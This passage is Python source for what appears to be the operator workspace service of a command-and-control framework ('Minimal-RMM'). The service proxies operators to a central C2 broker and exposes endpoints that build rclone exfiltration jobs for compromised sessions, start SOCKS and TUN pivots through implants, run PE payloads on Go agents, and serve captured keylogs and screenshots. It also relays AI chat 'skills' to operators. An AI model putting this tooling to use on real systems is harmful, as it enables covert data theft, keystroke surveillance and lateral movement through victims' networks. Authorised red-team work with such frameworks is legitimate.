        finally:
            self.stop()

    def stop(self) -> None:
        """Stop HTTP, synchronization, pivot listeners, and local storage."""
        self._running = False
        if self.http_server:
            self.http_server.shutdown()
            self.http_server.server_close()
            self.http_server = None
        self.pivots.stop_all()
        if self._sync_thread.is_alive():
            self._sync_thread.join(timeout=2.0)
        self.store.close()

    def _local_authorized(self, handler: BaseHTTPRequestHandler, qs: dict[str, list[str]]) -> bool:
        """Authenticate the local browser or CLI token when configured."""
        if not self.local_token:
            return True
        auth = handler.headers.get("Authorization", "")
        token = auth[7:].strip() if auth.startswith("Bearer ") else handler.headers.get("X-RMM-Token", "").strip()
        if not token:
            token = qs.get("token", [""])[0].strip()
        return hmac.compare_digest(token.encode(), self.local_token.encode())

    def _proxy(self, method: str, path: str, body: dict[str, Any] | None = None, timeout: float = 30):
        """Forward a non-local API call to the central broker."""
        return self.upstream.request(method, path, body, timeout=timeout)

    def _rclone_config(self) -> dict[str, Any]:
        """Return local profiles combined with central execution capabilities."""
        profiles = self.store.rclone_profiles() if hasattr(self, "store") else load_profiles()
        config = rclone_public_config(
            profiles=profiles,
            default_profile=get_rclone_default_profile(),
        )
        status, payload, _content_type = self._proxy("GET", "/api/v1/rclone/capabilities")
        if status == 200 and isinstance(payload, dict):
            config["rclone_binary"] = bool(payload.get("rclone_binary"))
            config["rclone_binary_path"] = None
            config["rclone_plugin"] = payload.get("rclone_plugin")
        else:
            config["rclone_binary"] = False
            config["rclone_binary_path"] = None
            config["rclone_plugin"] = None
        config["workspace_local"] = True
        config["profiles_scope"] = "workspace"
        return config

    def _workspace_exfil_job(
        self,
        session: dict[str, Any],
        remote_path: str,
        profile_name: str,
        dest: str | None,
        mode: str,
    ) -> tuple[dict[str, Any], dict[str, Any]]:
        """Build one workspace-owned rclone job and its public status."""
        mode = (mode or "auto").strip().lower()
        if mode not in {"auto", "plugin", "binary"}:
            raise ValueError("exfil mode must be auto, plugin, or binary")
        profiles = self.store.rclone_profiles() if hasattr(self, "store") else load_profiles()
        config = self._rclone_config()
        plugin_ready = bool(
            config.get("rclone_plugin")
            and str(session.get("agent_type") or "").lower() == "go"
            and "pe" in (session.get("capabilities") or [])
        )
        if mode in {"auto", "plugin"} and plugin_ready:
            job = {
                "plugin_job": build_plugin_exfil_job(
                    remote_path,
                    profile_name,
                    dest=dest,
                    profiles=profiles,
                    max_bytes=config.get("max_bytes"),
                ),
                "max_bytes": config.get("max_bytes"),
            }
            return job, config
        if mode == "plugin":
            raise ValueError("rclone plugin unavailable for this agent or workspace")
        if not config.get("rclone_binary"):
            raise RcloneConfigError(
                "rclone binary bootstrap is unavailable on the central control plane"
            )
        job = {
            "binary_payload": build_exfil_payload(
                remote_path,
                profile_name,
                dest=dest,
                profiles=profiles,
                max_bytes=config.get("max_bytes"),
            ),
            "max_bytes": config.get("max_bytes"),
        }
        return job, config

    def _local_session(self, ref: str) -> dict[str, Any] | None:
        """Resolve a local session row for API and pivot handlers."""
        return self.store.resolve_session(ref, active_only=True)

    def _embedding_api(self, method, parts, body=None):
        """Keep profiles and selected result collections in the local workspace."""
        def queue(ref, request):
            """Forward only a resolved execution request to the central broker."""
            session = self._local_session(ref)
            if not session:
                return 404, {"error": "session_not_found"}
            if session.get("agent_type") != "go" or "pe" not in session.get("capabilities", []):
                return 409, {"error": "requires_go_agent_with_pe_support"}
            status, payload, _ = self._proxy("POST", f"/api/v1/sessions/{session['id']}/pe", request)
            return status, payload

        def event(ref, event_id):
            """Resolve an exact event from local owned session history."""
            session = self.store.resolve_session(ref)
            if not session:
                return None, None
            rows = self.store.get_events(session["id"], since=event_id - 1, limit=1)
            return session["id"], next((e for e in rows or [] if e.get("id") == event_id), None)

        status, payload = embedding_api(self.store.embeddings, method, parts, body, queue, event)
        return status, payload, "application/json"

    def get_json(self, path: str, qs: dict[str, list[str]]) -> tuple[int, Any, str] | None:
        """Handle local JSON GET endpoints or return ``None`` for proxying."""
        parts = [part for part in path[len("/api/v1/"):].split("/") if part] if path.startswith("/api/v1/") else []
        if parts and parts[0] == "embeddings":
            return self._embedding_api("GET", parts)
        if parts == ["plugin-releases"]:
            status, payload = plugin_release_api(self.store.asset_store, "GET", tag=qs.get("tag", ["latest"])[0], source=qs.get("source", ["default"])[0])
            return status, payload, "application/json"
        if parts == ["plugin-sources"]:
            status, payload = plugin_sources_api(self.store.asset_store.root, "GET")
            return status, payload, "application/json"
        if path == "/api/v1/health":
            return 200, {"status": "ok", "sessions": len(self.store.list_sessions()), "workspace_id": self.workspace_id}, "application/json"
        if parts == ["ui", "config"]:
            try:
                config = self.store.get_ui_state()
            except UiStateError as exc:
                return 500, {"error": "ui_state_invalid", "detail": str(exc)}, "application/json"
            return (
                200,
                {
                    "config": config or {},
                    "exists": config is not None,
                    "storage": "sqlite",
                    "scope": "workspace",
                },
                "application/json",
            )
        if parts == ["sessions"]:
            return 200, {"sessions": self.store.list_sessions()}, "application/json"
        if len(parts) == 2 and parts[0] == "sessions":
            session = self._local_session(parts[1]) or self.store.resolve_session(parts[1])
            return (200, {"session": session}, "application/json") if session else (404, {"error": "session_not_found"}, "application/json")
        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "events":
            try:
                since = int(qs.get("since", ["0"])[0] or 0)
                limit = int(qs.get("limit", ["100"])[0] or 100)
            except ValueError:
                return 400, {"error": "invalid_cursor"}, "application/json"
            events = self.store.get_events(parts[1], since=since, limit=limit)
            return (200, {"events": events}, "application/json") if events is not None else (404, {"error": "session_not_found"}, "application/json")
        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "downloads":
            downloads = self.store.list_downloads(parts[1])
            session = self.store.resolve_session(parts[1])
            return (200, {"session_id": session["id"], "downloads": downloads or []}, "application/json") if downloads is not None and session else (404, {"error": "session_not_found"}, "application/json")
        if parts == ["history"]:
            rows = self.store.list_history()
            return 200, {"sessions": rows, "count": len(rows)}, "application/json"
        if len(parts) == 2 and parts[0] == "history":
            meta = self.store.history_meta(parts[1])
            return (200, {"session": meta}, "application/json") if meta else (404, {"error": "session_not_found"}, "application/json")
        if len(parts) == 3 and parts[0] == "history" and parts[2] == "events":
            try:
                since = int(qs.get("since", ["0"])[0] or 0)
                limit = int(qs.get("limit", ["500"])[0] or 500)
            except ValueError:
                return 400, {"error": "invalid_cursor"}, "application/json"
            events = self.store.get_events(parts[1], since=since, limit=limit)
            session = self.store.history_meta(parts[1])
            return (200, {"session_id": session["id"], "events": events or []}, "application/json") if session else (404, {"error": "session_not_found"}, "application/json")
        if parts == ["socks"]:
            rows = self.pivots.list_socks_status()
            return 200, {"count": len(rows), "relays": rows}, "application/json"
        if parts == ["tun"]:
            rows = self.pivots.list_tun_status()
            return 200, {"count": len(rows), "relays": rows}, "application/json"
        if parts == ["rclone", "config"]:
            return 200, self._rclone_config(), "application/json"
        if parts == ["assets"]:
            rows = self.store.asset_list()
            return 200, {"assets": rows, "count": len(rows), "workspace_local": True}, "application/json"
        if len(parts) == 2 and parts[0] == "assets":
            try:
                kind = parts[1]
                rows = self.store.asset_list(kind)
            except AssetError as exc:
                return 400, {"error": str(exc)}, "application/json"
            return 200, {"assets": rows, "count": len(rows), "workspace_local": True}, "application/json"
        if parts == ["plugins"]:
            # The central broker owns the runtime plugin inventory, including
            # artifacts seeded in its persistent volume and workspace copies.
            # The workspace service still owns URL-installed source metadata.
            return self._proxy("GET", path)
        if parts == ["ai", "skills"]:
            skills = self.store.list_skills()
            return 200, {"skills": skills, "count": len(skills), "workspace_local": True}, "application/json"
        if len(parts) == 4 and parts[0] == "sessions" and parts[2:4] == ["ai", "chat"]:
            sid, messages = self.store.get_ai_chat(parts[1])
            return (200, {"session_id": sid, "messages": messages or [], "count": len(messages or [])}, "application/json") if sid else (404, {"error": "session_not_found"}, "application/json")
        if parts == ["artifacts"]:
            kind = (qs.get("kind", ["downloads"])[0] or "downloads").strip().lower()
            try:
                artifacts = self.store.list_artifacts(kind)
            except ValueError as exc:
                return 400, {"error": "invalid_artifact_kind", "detail": str(exc)}, "application/json"
            return 200, {"kind": kind, "count": len(artifacts), "artifacts": artifacts, "workspace_local": True}, "application/json"
        if len(parts) == 3 and parts[0] == "artifacts":
            path_obj = self.store.artifact_path(parts[1], parts[2])
            if not path_obj:
                return 404, {"error": "not_found"}, "application/json"
            content_types = {
                "screenshots": "image/png",
                "keylogs": "text/plain; charset=utf-8",
            }
            return 200, path_obj.read_bytes(), content_types.get(parts[1], "application/octet-stream")
        return None

    def post_json(self, path: str, body: dict[str, Any]) -> tuple[int, Any, str] | None:
        """Handle local pivot and AI persistence endpoints or return ``None``."""
        parts = [part for part in path[len("/api/v1/"):].split("/") if part] if path.startswith("/api/v1/") else []
        if parts and parts[0] == "embeddings":
            return self._embedding_api("POST", parts, body)
        if parts == ["plugin-releases", "install"]:
            status, payload = plugin_release_api(self.store.asset_store, "POST", body=body, publish=self._sync_plugin_asset)
            return status, payload, "application/json"
        if len(parts) == 2 and parts[0] == "plugin-sources":
            status, payload = plugin_sources_api(self.store.asset_store.root, "POST", urllib.parse.unquote(parts[1]), body)
            return status, payload, "application/json"
        asset_kind = None
        if len(parts) == 2 and parts[0] == "assets":
            asset_kind = parts[1]
        elif parts == ["plugins"]:
            asset_kind = "plugins"
        elif parts == ["ai", "skills"]:
            asset_kind = "skills"
        elif parts == ["rclone", "profiles"]:
            asset_kind = "rclone"
        if asset_kind:
            try:
                name = str(body.get("name") or "").strip()
                content_b64 = body.get("content_b64")
                if content_b64 is not None:
                    content = decode_asset_content(content_b64, max_bytes=MAX_LOCAL_BODY)
                    if not name:
                        raise AssetError("uploaded asset name is required")
                    row = self.store.asset_store.add_bytes(
                        asset_kind,
                        name,
                        content,
                        enabled=bool(body.get("enabled", True)),
                    )
                else:
                    url = str(body.get("url") or "").strip()
                    if not url:
                        return 400, {"error": "missing_url_or_content"}, "application/json"
                    row = self.store.asset_store.add_url(
                        asset_kind,
                        url,
                        name=name,
                        enabled=bool(body.get("enabled", True)),
                    )
            except AssetError as exc:
                return 400, {"error": str(exc)}, "application/json"
            if asset_kind == "plugins" and not self._sync_plugin_asset(row):
                return 502, {"error": "central_plugin_cache_sync_failed", "asset": row}, "application/json"
            return 201, {"ok": True, "asset": row, "workspace_local": True}, "application/json"
        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "socks":
            session = self._local_session(parts[1])
            if not session:
                return 404, {"error": "session_not_found"}, "application/json"
            if body.get("stop"):
                result = self._proxy("POST", path, body)
                if result[0] == 200:
                    self.pivots.stop_socks(session["id"])
                return result
            status, payload, content_type = self._proxy("POST", path, body)
            if status != 200:
                return status, payload, content_type
            try:
                local = self.pivots.start_socks(session["id"], int(body.get("port", 1080)), str(body.get("bind_host", "127.0.0.1")))
            except Exception as exc:
                self._proxy("POST", path, {"stop": True})
                return 503, {"error": "workspace_socks_start_failed", "detail": str(exc)}, "application/json"
            response = dict(payload) if isinstance(payload, dict) else {}
            response.update({"socks_url": local["socks_url"], "socks": local, "workspace_local": True})
            return 200, response, "application/json"
        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "tun":
            session = self._local_session(parts[1])
            if not session:
                return 404, {"error": "session_not_found"}, "application/json"
            if body.get("stop"):
                result = self._proxy("POST", path, body)
                if result[0] == 200:
                    self.pivots.stop_tun(session["id"])
                return result
            status, payload, content_type = self._proxy("POST", path, body)
            if status != 200:
                return status, payload, content_type
            try:
                local = self.pivots.start_tun(session["id"], body)
            except Exception as exc:
                self._proxy("POST", path, {"stop": True})
                return 503, {"error": "workspace_tun_start_failed", "detail": str(exc)}, "application/json"
            response = dict(payload) if isinstance(payload, dict) else {}
            response.update({"tun": local, "workspace_local": True})
            return 200, response, "application/json"
        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "exfil":
            session = self._local_session(parts[1])
            if not session:
                return 404, {"error": "session_not_found"}, "application/json"
            remote_path = str(body.get("remote_path") or "").strip()
            if not remote_path:
                return 400, {"error": "missing_remote_path"}, "application/json"
            profile_name = str(body.get("profile") or get_rclone_default_profile()).strip()
            dest = str(body.get("dest") or "").strip() or None
            mode = str(body.get("mode") or "auto").strip().lower()
            try:
                workspace_job, config = self._workspace_exfil_job(
                    session, remote_path, profile_name, dest, mode
                )
            except (ValueError, RcloneConfigError) as exc:
                return 503, {"error": str(exc), "rclone": self._rclone_config()}, "application/json"
            upstream_body = {
                "remote_path": remote_path,
                "profile": profile_name,
                "dest": dest,
                "mode": mode,
                "workspace_job": workspace_job,
            }
            status, payload, content_type = self._proxy("POST", path, upstream_body)
            if status != 200:
                return status, payload, content_type
            response = dict(payload) if isinstance(payload, dict) else {}
            response.update(
                {
                    "profile": profile_name,
                    "mode": mode,
                    "max_bytes": config.get("max_bytes"),
                    "rclone": config,
                    "workspace_local": True,
                }
            )
            return 200, response, "application/json"
        if parts == ["ai", "chat"]:
            forwarded = dict(body)
            skill_ids = forwarded.get("skill_ids")
            if skill_ids is not None and not isinstance(skill_ids, list):
                return 400, {"error": "invalid_skill_ids"}, "application/json"
            forwarded["skill_documents"] = self.store.selected_skill_documents(skill_ids)
            status, payload, content_type = self._proxy("POST", path, forwarded, timeout=300)
            if status == 200 and isinstance(payload, dict) and payload.get("ok") and body.get("selected_session_id"):
                messages = list(body.get("messages") or [])
                reply = payload.get("message")
                if isinstance(reply, str):
                    messages.append({"role": "assistant", "content": reply})
                self.store.save_ai_chat(str(body["selected_session_id"]), messages)
            return status, payload, content_type
        return None

    def patch_json(self, path: str, body: dict[str, Any]) -> tuple[int, Any, str] | None:
        """Handle local asset enablement updates or return ``None`` for proxying."""
        parts = [part for part in path[len("/api/v1/"):].split("/") if part] if path.startswith("/api/v1/") else []
        if parts and parts[0] == "embeddings":
            return 405, {"error": "method_not_allowed"}, "application/json"
        if parts == ["ui", "config"]:
            try:
                result = self.store.set_ui_state(body.get("config", body))
            except UiStateError as exc:
                return 400, {"error": "invalid_ui_state", "detail": str(exc)}, "application/json"
            return (
                200,
                {
                    "ok": True,
                    "config": result["state"],
                    "updated_at": result["updated_at"],
                    "storage": "sqlite",
                    "scope": "workspace",
                },
                "application/json",
            )
        if len(parts) == 3 and parts[0] == "assets":
            kind, name = parts[1], urllib.parse.unquote(parts[2])
        elif len(parts) == 2 and parts[0] in {"plugins", "rclone", "skills"}:
            kind, name = parts[0], urllib.parse.unquote(parts[1])
        else:
            return None
        try:
            enabled = bool(body.get("enabled"))
            if kind in {"skills", "skill"} and not Path(name).suffix:
                row = self.store.asset_store.set_flag("skills", name, enabled)
            else:
                row = self.store.asset_store.set_enabled(kind, name, enabled)
        except AssetError as exc:
            return 404, {"error": str(exc)}, "application/json"
        if kind in {"plugins", "plugin"} and not self._sync_plugin_asset(row):
            return 502, {"error": "central_plugin_cache_sync_failed"}, "application/json"
        return 200, {"ok": True, "asset": row, "workspace_local": True}, "application/json"

    def delete_json(self, path: str) -> tuple[int, Any, str] | None:
        """Handle local history and AI deletion endpoints or return ``None``."""
        parts = [part for part in path[len("/api/v1/"):].split("/") if part] if path.startswith("/api/v1/") else []
        if parts and parts[0] == "embeddings":
            return self._embedding_api("DELETE", parts)
        if len(parts) == 2 and parts[0] == "plugin-sources":
            status, payload = plugin_sources_api(self.store.asset_store.root, "DELETE", urllib.parse.unquote(parts[1]))
            return status, payload, "application/json"
        if parts == ["history"]:
            deleted, errors = self.store.clear_history()
            return 200, {"ok": True, "deleted": deleted, "errors": errors}, "application/json"
        if len(parts) == 2 and parts[0] == "history":
            ok, session_id, error = self.store.delete_history(parts[1])
            if not ok:
                return (409 if error == "session_still_active" else 404), {"error": error}, "application/json"
            return 200, {"ok": True, "session_id": session_id}, "application/json"
        if len(parts) == 4 and parts[0] == "sessions" and parts[2:4] == ["ai", "chat"]:
            if not self.store.clear_ai_chat(parts[1]):
                return 404, {"error": "session_not_found"}, "application/json"
            return 200, {"ok": True, "session_id": parts[1]}, "application/json"
        if len(parts) == 3 and parts[0] == "assets":
            kind, name = parts[1], urllib.parse.unquote(parts[2])
        elif len(parts) == 2 and parts[0] in {"plugins", "rclone", "skills"}:
            kind, name = parts[0], urllib.parse.unquote(parts[1])
        else:
            kind = name = None
        if kind and name:
            try:
                removed = self.store.asset_store.remove(kind, name)
            except AssetError:
                removed = False
            if not removed:
                return 404, {"error": "asset_not_found"}, "application/json"
            if kind in {"plugins", "plugin"}:
                self._sync_plugin_asset({"name": name}, removed=True)
            return 200, {"ok": True, "kind": kind, "name": name}, "application/json"
        return None


class WorkspaceRequestHandler(BaseHTTPRequestHandler):
    """HTTP adapter for the workspace-local API and static WebUI."""

    service: WorkspaceService | None = None

    def log_message(self, _format, *_args):
        """Keep the default HTTP access log quiet in Exegol terminals."""

    def _json(self, status: int, payload: Any) -> None:
        """Write a JSON response."""
        raw = json.dumps(payload, ensure_ascii=False).encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(raw)))
        self.end_headers()
        self.wfile.write(raw)

    def _bytes(self, status: int, payload: bytes, content_type: str) -> None:
        """Write a binary or static response."""
        self.send_response(status)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(payload)))
        self.end_headers()
        self.wfile.write(payload)

    def _request_body(self) -> dict[str, Any]:
        """Read and decode a bounded JSON request body."""
        length = int(self.headers.get("Content-Length", "0") or 0)
        if length > MAX_LOCAL_BODY:
            raise ValueError("payload_too_large")
        raw = self.rfile.read(length) if length else b"{}"
        value = json.loads(raw.decode(errors="replace"))
        return value if isinstance(value, dict) else {}

    def _authorized(self, qs: dict[str, list[str]]) -> bool:
        """Check the workspace-local operator token."""
        return bool(self.service and self.service._local_authorized(self, qs))

    def _static(self, path: str) -> bool:
        """Serve the repository WebUI and mark it as polling-only."""
        if path == "/" or path == "":
            self.send_response(302)
            self.send_header("Location", "/ui/")
            self.end_headers()
            return True
        if path != "/ui" and not path.startswith("/ui/"):
            return False
        rel = path[len("/ui"):].lstrip("/") or "index.html"
        if rel == "workspace-config.js":
            self._bytes(200, b"window.RMM_WORKSPACE_MODE = true;\n", "application/javascript")
            return True
        if ".." in rel or rel.startswith(("/", "\\")):
            self._json(403, {"error": "forbidden"})
            return True
        file_path = (WEB_DIR / rel).resolve()
        if WEB_DIR.resolve() not in file_path.parents and file_path != WEB_DIR.resolve():
            self._json(403, {"error": "forbidden"})
            return True
        if not file_path.is_file():
            self._json(404, {"error": "not_found"})
            return True
        content_types = {
            ".html": "text/html; charset=utf-8",
            ".css": "text/css; charset=utf-8",
            ".js": "application/javascript; charset=utf-8",
            ".svg": "image/svg+xml",
        }
        self._bytes(200, file_path.read_bytes(), content_types.get(file_path.suffix.lower(), "application/octet-stream"))
        return True

    def _handle(self, method: str) -> None:
        """Dispatch one local HTTP request."""
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        qs = urllib.parse.parse_qs(parsed.query)
        # The login page and its static assets must load before the browser can
        # submit an API token. Operator data and actions still require auth.
        if method == "GET" and self._static(path):
            return
        if not self._authorized(qs):
            self._json(401, {"error": "unauthorized"})
            return
        if path == "/api/v1/ws":
            self._json(426, {"error": "workspace_polling_only"})
            return
        try:
            body = self._request_body() if method in {"POST", "PATCH"} else None
        except (ValueError, json.JSONDecodeError) as exc:
            self._json(413 if str(exc) == "payload_too_large" else 400, {"error": str(exc)})
            return

        result = None
        if method == "GET":
            result = self.service.get_json(path, qs)
        elif method == "POST":
            result = self.service.post_json(path, body or {})
        elif method == "PATCH":
            result = self.service.patch_json(path, body or {})
        elif method == "DELETE":
            result = self.service.delete_json(path)
        if result is None:
            timeout = 300 if path.endswith("/exec") or path.endswith("/ai/chat") else 30
            status, payload, content_type = self.service._proxy(method, path, body, timeout=timeout)
            result = (status, payload, content_type)
        status, payload, content_type = result
        if isinstance(payload, (bytes, bytearray)):
            self._bytes(status, bytes(payload), content_type)
        else:
            self._json(status, payload)

    def do_GET(self):
        """Handle GET requests."""
        self._handle("GET")

    def do_POST(self):
        """Handle POST requests."""
        self._handle("POST")

    def do_PATCH(self):
        """Handle PATCH requests."""
        self._handle("PATCH")

    def do_DELETE(self):
        """Handle DELETE requests."""
        self._handle("DELETE")


def main() -> int:
    """Parse environment and command-line settings, then run one workspace service."""
    parser = argparse.ArgumentParser(description="Minimal-RMM per-operator workspace service")
    parser.add_argument("--central-url", default=os.environ.get("RMM_C2_URL", "http://127.0.0.1:8080"))
    parser.add_argument("--workspace-id", default=os.environ.get("RMM_WORKSPACE_ID", ""))
    parser.add_argument("--workspace-token", default=os.environ.get("RMM_WORKSPACE_TOKEN", ""))
    parser.add_argument("--data-dir", default=str(DEFAULT_DATA_DIR))
    parser.add_argument("--bind", default=os.environ.get("RMM_WORKSPACE_BIND", DEFAULT_BIND))
    parser.add_argument("--port", type=int, default=int(os.environ.get("RMM_WORKSPACE_PORT", DEFAULT_PORT)))
    parser.add_argument("--local-token", default=os.environ.get("RMM_WORKSPACE_LOCAL_TOKEN", ""))
    parser.add_argument("--tun-helper", default=os.environ.get("RMM_WORKSPACE_TUN_HELPER", "tools/rmm-tun"))
    parser.add_argument("--auto-claim", action="store_true", default=os.environ.get("RMM_WORKSPACE_AUTO_CLAIM", "0").lower() in {"1", "true", "yes"})
    parser.add_argument("--poll-interval", type=float, default=float(os.environ.get("RMM_WORKSPACE_POLL_INTERVAL", "1")))
    args = parser.parse_args()
    if not args.workspace_id or not args.workspace_token:
        parser.error("--workspace-id and --workspace-token are required")
    service = WorkspaceService(
        central_url=args.central_url,
        workspace_id=args.workspace_id,
        workspace_token=args.workspace_token,
        data_dir=args.data_dir,
        bind=args.bind,
        port=args.port,
        local_token=args.local_token,
        tun_helper=args.tun_helper,
        auto_claim=args.auto_claim,
        poll_interval=args.poll_interval,
    )
    service.serve_forever()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
